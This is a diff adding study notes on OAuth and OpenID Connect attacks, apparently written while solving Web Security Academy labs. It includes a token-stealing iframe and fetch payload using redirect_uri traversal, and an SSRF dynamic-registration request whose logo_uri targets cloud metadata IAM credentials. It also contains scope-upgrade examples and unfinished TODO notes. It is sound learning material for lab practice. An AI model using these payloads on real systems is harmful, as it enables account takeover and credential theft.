@@ -226,4 +226,131 @@ Location: https://0a7e005f0376bcf1807721b000fb00dd.web-security-academy.net/oaut
 
 Therefore we can check logs of our own external server and find that `access_token` there.
 
+### Lab: Stealing OAuth access tokens via a proxy page
+`redirect_uri` is vulnerable to directory traversal 
+TODO: this lab does not work properly: after deliver exploit to victim, victim does not always makes a request to the exploit server
+
+BTW: TODO: figure out why you're getting an error inside of an iframe
+
+example of a solution:
+```bash
+<iframe src="https://oauth-0aa900560362c79580a2d84c02cb00ec.oauth-server.net/auth?client_id=uje8kqatmq881p5y2mjp7&redirect_uri=https://0ae300c703aac7548029daaf000a00d1.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1382260837&scope=openid%20profile%20email"></iframe>
+
+<script>
+    window.addEventListener('message', function(e) {
+        const data = encodeURIComponent(e.data.data);
+        fetch("/" + data)
+    }, false)
+</script>
+```
+
+
+## Flawed scope validation
+In any OAuth flow, the user must approve the requested access based on the scope defined in the authorization request. The resulting token allows the client application to access only the scope that was approved by the user. But in some cases, it may be possible for an attacker to "upgrade" an access token (either stolen or obtained using a malicious client application) with extra permissions due to flawed validation by the OAuth service. The process for doing this depends on the grant type.
+
+### Scope upgrade: authorization code flow
+With the authorization code grant type, the user's data is requested and sent via secure server-to-server communication, which a third-party attacker is typically not able to manipulate directly. However, it may still be possible to achieve the same result by registering their own client application with the OAuth service.
+
+For example, let's say the attacker's malicious client application initially requested access to the user's email address using the openid email scope. After the user approves this request, the malicious client application receives an authorization code. As the attacker controls their client application, they can add another scope parameter to the code/token exchange request containing the additional profile scope:
+```
+POST /token
+Host: oauth-authorization-server.com
+…
+client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&scope=openid%20 email%20profile
+```
+If the server does not validate this against the scope from the initial authorization request, it will sometimes generate an access token using the new scope and send this to the attacker's client application:
+```
+{
+    "access_token": "z0y9x8w7v6u5",
+    "token_type": "Bearer",
+    "expires_in": 3600,
+    "scope": "openid email profile",
+    …
+}
+```
+The attacker can then use their application to make the necessary API calls to access the user's profile data.
+
+### Scope upgrade: implicit flow
+For the implicit grant type, the access token is sent via the browser, which means an attacker can steal tokens associated with innocent client applications and use them directly. Once they have stolen an access token, they can send a normal browser-based request to the OAuth service's /userinfo endpoint, manually adding a new scope parameter in the process.
+
+Ideally, the OAuth service should validate this scope value against the one that was used when generating the token, but this isn't always the case. As long as the adjusted permissions don't exceed the level of access previously granted to this client application, the attacker can potentially access additional data without requiring further approval from the user.
+
+### Unverified user registration
+When authenticating users via OAuth, the client application makes the implicit assumption that the information stored by the OAuth provider is correct. This can be a dangerous assumption to make.
+
+Some websites that provide an OAuth service allow users to register an account without verifying all of their details, including their email address in some cases. An attacker can exploit this by registering an account with the OAuth provider using the same details as a target user, such as a known email address. Client applications may then allow the attacker to sign in as the victim via this fraudulent account with the OAuth provider.
+
+## OpenID Connect
+### Identifying OpenID Connect
+Even if the login process does not initially appear to be using OpenID Connect, it is still worth checking whether the OAuth service supports it. You can simply try adding the openid scope or changing the response type to id_token and observing whether this results in an error.
+
+As with basic OAuth, it's also a good idea to take a look at the OAuth provider's documentation to see if there's any useful information about their OpenID Connect support. You may also be able to access the configuration file from the standard endpoint /.well-known/openid-configuration.
+
+### Unprotected dynamic client registration
+The OpenID specification outlines a standardized way of allowing client applications to register with the OpenID provider. If dynamic client registration is supported, the client application can register itself by sending a POST request to a dedicated /registration endpoint. The name of this endpoint is usually provided in the configuration file and documentation.
+
+In the request body, the client application submits key information about itself in JSON format. For example, it will often be required to include an array of whitelisted redirect URIs. It can also submit a range of additional information, such as the names of the endpoints they want to expose, a name for their application, and so on. A typical registration request may look something like this:
+```
+POST /openid/register HTTP/1.1
+Content-Type: application/json
+Accept: application/json
+Host: oauth-authorization-server.com
+Authorization: Bearer ab12cd34ef56gh89
+
+{
+    "application_type": "web",
+    "redirect_uris": [
+        "https://client-app.com/callback",
+        "https://client-app.com/callback2"
+        ],
+    "client_name": "My Application",
+    "logo_uri": "https://client-app.com/logo.png",
+    "token_endpoint_auth_method": "client_secret_basic",
+    "jwks_uri": "https://client-app.com/my_public_keys.jwks",
+    "userinfo_encrypted_response_alg": "RSA1_5",
+    "userinfo_encrypted_response_enc": "A128CBC-HS256",
+    …
+}
+```
+The OpenID provider should require the client application to authenticate itself. In the example above, they're using an HTTP bearer token. However, some providers will allow dynamic client registration without any authentication, which enables an attacker to register their own malicious client application. This can have various consequences depending on how the values of these attacker-controllable properties are used.
+
+For example, you may have noticed that some of these properties can be provided as URIs. If any of these are accessed by the OpenID provider, this can potentially lead to second-order SSRF vulnerabilities unless additional security measures are in place.
+
+### Lab: SSRF via OpenID dynamic client registration
+Some OAuth providers allow dynamic client registration without any authentication
+
+To check configuration of OAuth provider use the following url:
+```
+/.well-known/openid-configuration
+```
+e.g.:
+```
+https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration
+```
+
+In the response of configuration we got:
+```
+"registration_endpoint":"https://oauth-0ab1000b04cf85ab80a6c41b025f0095.oauth-server.net/reg"
+```
+We can use that endpoint to register our app in OAuth provider
+
+During the OAuth flow audit we notice that the "Authorize" page, where the user consents to the requested permissions, displays the client application's logo.
+
+This is fetched from `/client/CLIENT-ID/logo`. We know from the OpenID specification that client applications can provide the URL for their logo using the `logo_uri` property during dynamic registration
+
+But instead of providing a valid logo url during dynamic oauth service registration we can provide a url of inner local network, e.g.:
+```
+POST /reg HTTP/1.1
+Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
+Content-Type: application/json
+
+{
+    "redirect_uris" : [
+        "https://example.com"
+    ],
+    "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"
+}
+```
+
+And later when we make a request to get that logo from the OAuth service, the OAuth server will make a request to `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin` and will send a response from it to us
 
